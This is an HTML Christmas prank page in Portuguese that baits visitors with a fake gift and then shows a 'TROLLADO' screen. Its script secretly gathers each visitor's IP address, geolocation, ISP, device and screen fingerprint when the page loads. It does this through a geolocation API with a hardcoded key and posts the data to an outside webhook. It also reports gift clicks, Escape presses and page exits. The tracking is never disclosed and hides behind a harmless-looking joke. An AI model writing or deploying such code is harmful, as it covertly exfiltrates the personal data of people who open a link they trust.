<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÅ Voc√™ Ganhou um Presente! üéÅ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Comic Sans MS', cursive, sans-serif;
            overflow: hidden;
            height: 100vh;
            transition: background 0.3s;
        }

        .bait-screen {
            background: linear-gradient(135deg, #1a472a 0%, #2d5a3f 100%);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            text-align: center;
            padding: 20px;
        }

        .gift-box {
            font-size: 120px;
            animation: bounce 1s ease infinite;
            cursor: pointer;
            transition: transform 0.3s;
        }

        .gift-box:hover {
            transform: scale(1.2);
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }

        .bait-title {
            font-size: 2.5rem;
            margin: 20px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }

        .bait-subtitle {
            font-size: 1.3rem;
            opacity: 0.9;
            margin-bottom: 30px;
        }

        .open-btn {
            background: linear-gradient(45deg, #c41e3a, #ff6b6b);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 1.5rem;
            border-radius: 50px;
            cursor: pointer;
            font-family: inherit;
            box-shadow: 0 10px 30px rgba(196, 30, 58, 0.4);
            transition: all 0.3s;
            animation: pulse 2s ease infinite;
        }

        .open-btn:hover {
            transform: scale(1.1);
            box-shadow: 0 15px 40px rgba(196, 30, 58, 0.6);
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 10px 30px rgba(196, 30, 58, 0.4); }
            50% { box-shadow: 0 10px 50px rgba(196, 30, 58, 0.8); }
        }

        .troll-screen {
            display: none;
            height: 100vh;
            background: linear-gradient(45deg, #ff0000, #00ff00, #ff0000, #00ff00);
            background-size: 400% 400%;
            animation: crazyBg 0.5s ease infinite;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
            position: relative;
        }

        @keyframes crazyBg {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .troll-title {
            font-size: 4rem;
            color: white;
            text-shadow: 3px 3px 0 #000, -3px -3px 0 #000, 3px -3px 0 #000, -3px 3px 0 #000;
            animation: shake 0.1s ease infinite, rainbow 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0) rotate(0); }
            25% { transform: translateX(-5px) rotate(-2deg); }
            75% { transform: translateX(5px) rotate(2deg); }
        }

        @keyframes rainbow {
            0% { color: #ff0000; }
            16% { color: #ff8800; }
            33% { color: #ffff00; }
            50% { color: #00ff00; }
            66% { color: #0088ff; }
            83% { color: #8800ff; }
            100% { color: #ff0000; }
        }

        .troll-message {
            font-size: 2rem;
            color: yellow;
            text-shadow: 2px 2px 0 #000;
            margin: 20px 0;
            animation: blink 0.3s ease infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .christmas-message {
            font-size: 1.8rem;
            color: white;
            background: rgba(0,0,0,0.7);
            padding: 30px;
            border-radius: 20px;
            margin-top: 30px;
            max-width: 600px;
            animation: popIn 0.5s ease;
        }

        @keyframes popIn {
            0% { transform: scale(0); }
            50% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }

        .emoji-rain {
            position: fixed;
            font-size: 40px;
            animation: fall linear forwards;
            z-index: 1000;
        }

        @keyframes fall {
            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
        }

        .dancing-santa {
            font-size: 80px;
            animation: dance 0.3s ease infinite;
            display: inline-block;
        }

        @keyframes dance {
            0%, 100% { transform: rotate(-10deg) translateY(0); }
            50% { transform: rotate(10deg) translateY(-10px); }
        }

        .snowflake {
            position: fixed;
            color: white;
            font-size: 20px;
            animation: snowfall linear forwards;
            z-index: 999;
            text-shadow: 0 0 5px white;
        }

        @keyframes snowfall {
            0% { transform: translateY(-20px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(360deg); opacity: 0.3; }
        }

        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            animation: confettiFall linear forwards;
            z-index: 1001;
        }

        @keyframes confettiFall {
            0% { transform: translateY(-20px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
        }

        .volume-warning {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 15px 25px;
            border-radius: 10px;
            font-size: 1rem;
            z-index: 9999;
        }

        .credit {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            color: white;
            background: rgba(0,0,0,0.5);
            padding: 10px 20px;
            border-radius: 20px;
            font-size: 0.9rem;
        }

        .loading {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.8);
            color: white;
            padding: 20px;
            border-radius: 10px;
            z-index: 10001;
        }
    </style>
</head>
<body>
    <div class="loading" id="loading">
        Carregando... üéÑ
    </div>

    <div class="bait-screen" id="baitScreen">
        <div class="gift-box" onclick="startTroll()">üéÅ</div>
        <h1 class="bait-title">Voc√™ recebeu um presente de Natal!</h1>
        <p class="bait-subtitle">Algu√©m especial enviou isso para voc√™ ‚ù§Ô∏è</p>
        <button class="open-btn" onclick="startTroll()">üéÑ ABRIR PRESENTE üéÑ</button>
    </div>

    <div class="troll-screen" id="trollScreen">
        <div class="dancing-santa">üéÖ</div>
        <h1 class="troll-title">üö® TROLLADO! üö®</h1>
        <p class="troll-message">CAIU DIREITINHO KKKKKKK</p>
        <div class="christmas-message">
            <p>üéÑ Mas relaxa, √© s√≥ uma brincadeira! üéÑ</p>
            <br>
            <p>üéÖ <strong>FELIZ NATAL!</strong> üéÖ</p>
            <br>
            <p>Que seu Natal seja cheio de alegria, risadas e muito amor! üéÅ‚ú®</p>
            <br>
            <p>Com carinho de quem te mandou esse link üòú‚ù§Ô∏è</p>
            <br>
            <p class="dancing-santa" style="font-size: 50px;">ü¶åüéÑüéÅüîî‚≠êüéÖ</p>
        </div>
        <div class="volume-warning">üîä Abaixe o volume se precisar kkkk</div>
        <div class="credit">Feito com ‚ù§Ô∏è e muita zoeira</div>
    </div>

    <audio id="christmasMusic" loop>
        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
    </audio>

    <script>
        let trollStarted = false;
        const WEBHOOK_URL = 'https://blue-owl-08.webhook.cool';

        // Cache dos dados de IP para n√£o fazer m√∫ltiplas requisi√ß√µes
        let cachedIpData = null;

        // API Key do ipgeolocation.io
        const IPGEO_API_KEY = '929196568ff04c02a6d494d40a6e25c3';

        // Fun√ß√£o para obter dados de IP usando ipgeolocation.io
        async function getIpData() {
            if (cachedIpData) return cachedIpData;

            try {
                console.log('üåê Buscando dados de IP via ipgeolocation.io...');
                
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 8000);
                
                const response = await fetch(
                    `https://api.ipgeolocation.io/v2/ipgeo?apiKey=${IPGEO_API_KEY}`,
                    { 
                        signal: controller.signal,
                        headers: { 'Accept': 'application/json' }
                    }
                );
                clearTimeout(timeoutId);
                
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                
                const data = await response.json();
                console.log('üìç Dados completos recebidos:', data);
                
                // A API j√° retorna location como objeto completo
                cachedIpData = {
                    ip: data.ip,
                    location: data.location || {},
                    country_metadata: data.country_metadata || null,
                    currency: data.currency || null,
                    time_zone: data.time_zone || null,
                    isp: data.isp || null,
                    organization: data.organization || null,
                    connection_type: data.connection_type || null,
                    source: 'ipgeolocation.io'
                };
                
                console.log('‚úÖ Dados processados:', cachedIpData);
                return cachedIpData;
                
            } catch (error) {
                console.error('‚ùå Erro ao buscar IP:', error.message);
                
                return {
                    ip: 'unknown',
                    location: {
                        city: 'Desconhecido',
                        state_prov: 'Desconhecido',
                        country_name: 'Desconhecido'
                    },
                    source: 'fallback',
                    error: error.message
                };
            }
        }

        // Coleta dados ao carregar a p√°gina
        document.addEventListener('DOMContentLoaded', async function() {
            try {
                const ipData = await getIpData();
                
                const trackingData = {
                    event: 'page_visit',
                    timestamp: new Date().toISOString(),
                    
                    // Dados completos da API ipgeolocation.io
                    ip: ipData.ip,
                    location: ipData.location,
                    country_metadata: ipData.country_metadata,
                    currency: ipData.currency,
                    time_zone: ipData.time_zone,
                    isp: ipData.isp,
                    organization: ipData.organization,
                    connection_type: ipData.connection_type,
                    
                    // Dados do dispositivo/navegador
                    device: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        vendor: navigator.vendor,
                        language: navigator.language,
                        languages: navigator.languages,
                        cookiesEnabled: navigator.cookieEnabled,
                        doNotTrack: navigator.doNotTrack,
                        hardwareConcurrency: navigator.hardwareConcurrency,
                        maxTouchPoints: navigator.maxTouchPoints,
                        pdfViewerEnabled: navigator.pdfViewerEnabled
                    },
                    screen: {
                        width: window.screen.width,
                        height: window.screen.height,
                        availWidth: window.screen.availWidth,
                        availHeight: window.screen.availHeight,
                        colorDepth: window.screen.colorDepth,
                        pixelDepth: window.screen.pixelDepth,
                        orientation: window.screen.orientation?.type
                    },
                    window: {
                        innerWidth: window.innerWidth,
                        innerHeight: window.innerHeight,
                        outerWidth: window.outerWidth,
                        outerHeight: window.outerHeight,
                        devicePixelRatio: window.devicePixelRatio
                    },
                    connection: navigator.connection ? {
                        effectiveType: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink,
                        rtt: navigator.connection.rtt,
                        saveData: navigator.connection.saveData
                    } : null,
                    
                    // Outros dados
                    referrer: document.referrer || 'Direct',
                    url: window.location.href,
                    title: document.title,
                    
                    // Fonte dos dados
                    apiSource: ipData.source
                };

                sendToWebhook(trackingData);
            } catch (error) {
                console.error('Erro ao coletar dados iniciais:', error);
            }
        });

        async function startTroll() {
            if (trollStarted) return;
            trollStarted = true;
            
            document.getElementById('loading').style.display = 'block';

            try {
                const ipData = await getIpData();
                
                const interactionData = {
                    event: 'present_opened',
                    timestamp: new Date().toISOString(),
                    
                    // Dados completos da API ipgeolocation.io
                    ip: ipData.ip,
                    location: ipData.location,
                    country_metadata: ipData.country_metadata,
                    currency: ipData.currency,
                    time_zone: ipData.time_zone,
                    isp: ipData.isp,
                    organization: ipData.organization,
                    connection_type: ipData.connection_type,
                    
                    // Dados do dispositivo
                    device: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language
                    },
                    
                    apiSource: ipData.source
                };

                sendToWebhook(interactionData);
            } catch (error) {
                console.error('Erro ao coletar dados da intera√ß√£o:', error);
            } finally {
                document.getElementById('loading').style.display = 'none';
                
                document.getElementById('baitScreen').style.display = 'none';
                document.getElementById('trollScreen').style.display = 'flex';

                const music = document.getElementById('christmasMusic');
                music.volume = 0.5;
                music.play().catch(() => console.log('Autoplay bloqueado'));

                startEmojiRain();
                startSnowfall();
                startConfetti();

                if (navigator.vibrate) {
                    navigator.vibrate([200, 100, 200, 100, 200]);
                }
            }
        }

        function sendToWebhook(data) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (!response.ok) console.error('Erro webhook:', response.status);
                else console.log('‚úÖ Dados enviados:', data.event);
            })
            .catch(error => console.error('Falha webhook:', error));
        }

        function startEmojiRain() {
            const emojis = ['üéÖ', 'üéÑ', 'üéÅ', '‚≠ê', 'üîî', '‚ùÑÔ∏è', 'ü¶å', 'üç™', 'ü•õ', 'üéâ', 'üéä', 'üòú', 'ü§£', 'üíÄ'];
            setInterval(() => {
                const emoji = document.createElement('div');
                emoji.className = 'emoji-rain';
                emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
                emoji.style.left = Math.random() * 100 + 'vw';
                emoji.style.animationDuration = (Math.random() * 2 + 2) + 's';
                document.body.appendChild(emoji);
                setTimeout(() => emoji.remove(), 4000);
            }, 150);
        }

        function startSnowfall() {
            setInterval(() => {
                const snow = document.createElement('div');
                snow.className = 'snowflake';
                snow.textContent = '‚ùÑ';
                snow.style.left = Math.random() * 100 + 'vw';
                snow.style.fontSize = (Math.random() * 20 + 10) + 'px';
                snow.style.animationDuration = (Math.random() * 3 + 3) + 's';
                document.body.appendChild(snow);
                setTimeout(() => snow.remove(), 6000);
            }, 100);
        }

        function startConfetti() {
            const colors = ['#ff0000', '#00ff00', '#ffff00', '#ff00ff', '#00ffff', '#ffa500'];
            setInterval(() => {
                const confetti = document.createElement('div');
                confetti.className = 'confetti';
                confetti.style.left = Math.random() * 100 + 'vw';
                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
                confetti.style.width = (Math.random() * 10 + 5) + 'px';
                confetti.style.height = (Math.random() * 10 + 5) + 'px';
                document.body.appendChild(confetti);
                setTimeout(() => confetti.remove(), 4000);
            }, 50);
        }

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                document.getElementById('christmasMusic').pause();
                document.querySelector('.troll-screen').style.animation = 'none';
                document.querySelector('.troll-screen').style.background = '#1a472a';
                document.querySelector('.troll-title').style.animation = 'none';
                
                sendToWebhook({
                    event: 'user_escaped',
                    timestamp: new Date().toISOString(),
                    reason: 'escape_key'
                });
                
                alert('üéÖ Ok, ok... Feliz Natal de verdade! üéÑ');
            }
        });

        window.addEventListener('beforeunload', function() {
            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
                event: 'page_exit',
                timestamp: new Date().toISOString(),
                timeOnPage: Math.round(performance.now() / 1000)
            }));
        });
    </script>
</body>
</html>
